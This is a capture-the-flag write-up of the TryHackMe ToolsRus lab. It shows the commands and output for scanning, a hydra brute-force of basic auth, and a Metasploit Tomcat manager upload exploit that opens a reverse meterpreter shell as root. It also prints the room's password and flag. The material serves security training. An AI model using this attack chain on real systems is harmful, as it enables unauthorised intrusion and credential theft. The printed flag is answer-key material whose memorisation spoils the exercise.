---
title: "TryHackMe ToolsRus CTF"
date: 2022-12-04 14:49:00 +0100
categories: [TryHackMe, CTF]
tags: [tryhackme, ctf, hacking, kali linux, offensive]     # TAG names should always be lowercase
---

My Write-up of the TryHackMe CTF ToolsRus:

## Scan
From the first question I gather, that a directory scan will be needed, but first I just start an NMAP scan:
```bash
$ nmap -A -p- 10.10.198.52 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-17 06:46 EST
Nmap scan report for 10.10.198.52
Host is up (0.031s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:4c:41:ad:a7:13:e3:b5:5f:4d:f2:74:c7:f0:fc:32 (RSA)
|   256 ea:eb:32:5d:65:4a:b4:1a:1c:ef:0d:ac:76:6c:6c:5b (ECDSA)
|_  256 b3:ef:63:4d:59:a5:bb:80:fb:9a:2e:7b:36:bf:0d:77 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn´t have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.37 seconds

```
<hr>

Now we have a basic overview of the machine we are dealing with and go on to use gobuster on both webservices (Port 80 and 1234):

Port 80:
```bash
$ gobuster dir -u http://10.10.198.52/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.198.52/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/11/17 06:48:54 Starting gobuster in directory enumeration mode
===============================================================
/guidelines           (Status: 301) [Size: 317] [--> http://10.10.198.52/guidelines/]
/protected            (Status: 401) [Size: 459]
```
Port 1234:
```bash
$ gobuster dir -u http://10.10.198.52:1234/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.198.52:1234/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/11/17 06:58:06 Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/] 
/http%3A%2F%2Fwww     (Status: 400) [Size: 0]                 
/http%3A%2F%2Fyoutube (Status: 400) [Size: 0]                 
/http%3A%2F%2Fblogs   (Status: 400) [Size: 0]                 
/http%3A%2F%2Fblog    (Status: 400) [Size: 0]                 
/**http%3A%2F%2Fwww   (Status: 400) [Size: 0]                 
Progress: 83250 / 220561 (37.74%)                            ^C
[!] Keyboard interrupt detected, terminating.
                                                              
===============================================================
2022/11/17 07:02:38 Finished
===============================================================
```
We can already answer **Q1**.
<hr>


Go and check out the directories and we find ``` "Hey bob, did you update that TomCat server?" ```.
And secondly we find a page requiring authentication.

Now go and answer **Q2** and **Q3**.


## Initial access
The authentication method is basic auth, which we can attack using hydra:
```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.198.52 http-head /protected/ 
```
The resulting password is: ```bubbles```, which answers **Q4**.

For **Q5** and **Q6** just look at our results from the NMAP scan.
Hint: Apache Tomcat is used for webservers.


To answer **Q7**, we so a nikto scan:
```bash 
$ nikto -h http://10.10.198.52:1234/manager/html -id bob:bubbles
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.198.52
+ Target Hostname:    10.10.198.52
+ Target Port:        1234
+ Start Time:         2022-11-17 07:04:49 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
…
+ OSVDB-3233: /manager/html/manager/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/jk-manager/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/jk-status/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/admin/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/host-manager/manager-howto.html: Tomcat documentation found.
+ /manager/html/manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html/jk-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html/jk-status/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html/admin/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html/host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html/httpd.conf: Apache httpd.conf configuration file
+ /manager/html/httpd.conf.bak: Apache httpd.conf configuration file
+ /manager/html/manager/status: Default Tomcat Server Status interface found
+ /manager/html/jk-manager/status: Default Tomcat Server Status interface found
+ /manager/html/jk-status/status: Default Tomcat Server Status interface found
+ /manager/html/admin/status: Default Tomcat Server Status interface found
+ /manager/html/host-manager/status: Default Tomcat Server Status interface found
+ 26522 requests: 0 error(s) and 94 item(s) reported on remote host
+ End Time:           2022-11-17 07:21:07 (GMT-5) (978 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

And we find 5 entries saying ```"Tomcat documentation found"```.

**Q8** and **Q9** again needs us to take a look at our earlier nmap scan.

## Exploit

Now we know both from gobuster and from Q7 that we have the /manager/ directory, which after a short google sesh turns out to have several possible vulnerabilities. 

Start Metasploit with ```"msfconsole"``` and use the "search" functionaility of metasploit to find an exploit we can use:
```shell
msf6 >  search tomcat manager

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  auxiliary/dos/http/apache_commons_fileupload_dos  2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   1  exploit/multi/http/tomcat_mgr_deploy              2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   2  exploit/multi/http/tomcat_mgr_upload              2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   3  exploit/multi/http/cisco_dcnm_upload_2019         2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   4  auxiliary/admin/http/ibm_drm_download             2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
   5  auxiliary/scanner/http/tomcat_mgr_login                            normal     No     Tomcat Application Manager Login Utility


Interact with a module by name or index. For example info 5, use 5 or use auxiliary/scanner/http/tomcat_mgr_login
```

Using google we find that tge Upload exploit seems to be one of the most common ones and so we just go ahead and try it:
```shell
msf6 > use 2
msf6 exploit(multi/http/tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  xxx              yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
HttpPassword => bubbles
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
HttpUsername => bob
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.198.52
RHOSTS => 10.10.198.52
msf6 exploit(multi/http/tomcat_mgr_upload) > set rport 1234
rport => 1234
msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST <attacker ip>
LHOST => <ip>
msf6 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on <ip>:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying tkyIXestuktMB2DrHVNFIcjt8y4Q9Ht...
[*] Executing tkyIXestuktMB2DrHVNFIcjt8y4Q9Ht...
[*] Undeploying tkyIXestuktMB2DrHVNFIcjt8y4Q9Ht ...
[*] Sending stage (58829 bytes) to 10.10.198.52
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (<ip>:4444 -> 10.10.198.52:40810) at 2022-11-17 07:39:54 -0500

meterpreter >
```
We got a meterpreter session. Lets have a look around and answer **Q10** and **Q11**:
```
meterpreter > ls
Listing: /
==========

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
040776/rwxrwxrw-  4096      dir   2019-03-11 02:13:25 -0400  bin
040776/rwxrwxrw-  4096      dir   2019-03-11 02:13:35 -0400  boot
040776/rwxrwxrw-  3260      dir   2022-11-17 06:44:23 -0500  dev
040776/rwxrwxrw-  4096      dir   2022-11-17 06:44:55 -0500  etc
040776/rwxrwxrw-  4096      dir   2019-03-10 17:52:32 -0400  home
100666/rw-rw-rw-  12713476  fil   2019-03-11 02:13:35 -0400  initrd.img
040776/rwxrwxrw-  4096      dir   2019-02-12 12:47:22 -0500  lib
040776/rwxrwxrw-  4096      dir   2019-02-12 12:28:02 -0500  lib64
040776/rwxrwxrw-  16384     dir   2019-02-12 12:37:53 -0500  lost+found
040776/rwxrwxrw-  4096      dir   2019-02-12 12:27:12 -0500  media
040776/rwxrwxrw-  4096      dir   2019-02-12 12:27:12 -0500  mnt
040776/rwxrwxrw-  4096      dir   2019-02-12 12:27:12 -0500  opt
040776/rwxrwxrw-  0         dir   2022-11-17 06:44:15 -0500  proc
040776/rwxrwxrw-  4096      dir   2019-03-11 12:06:14 -0400  root
040776/rwxrwxrw-  860       dir   2022-11-17 06:45:11 -0500  run
040776/rwxrwxrw-  12288     dir   2019-03-11 02:13:26 -0400  sbin
040776/rwxrwxrw-  4096      dir   2019-03-10 17:52:41 -0400  snap
040776/rwxrwxrw-  4096      dir   2019-02-12 12:27:12 -0500  srv
040776/rwxrwxrw-  0         dir   2022-11-17 06:44:18 -0500  sys
040776/rwxrwxrw-  4096      dir   2022-11-17 07:39:54 -0500  tmp
040776/rwxrwxrw-  4096      dir   2019-02-12 12:27:12 -0500  usr
040776/rwxrwxrw-  4096      dir   2019-03-10 18:19:00 -0400  var
100666/rw-rw-rw-  7030080   fil   2019-01-17 12:53:59 -0500  vmlinuz

meterpreter > cd home
meterpreter > getuid
Server username: root
meterpreter > cat /root/flag.txt
ff1fc4a81affcc7688cf89ae7dc6e0e1
```

And that's all. We have the root flag.

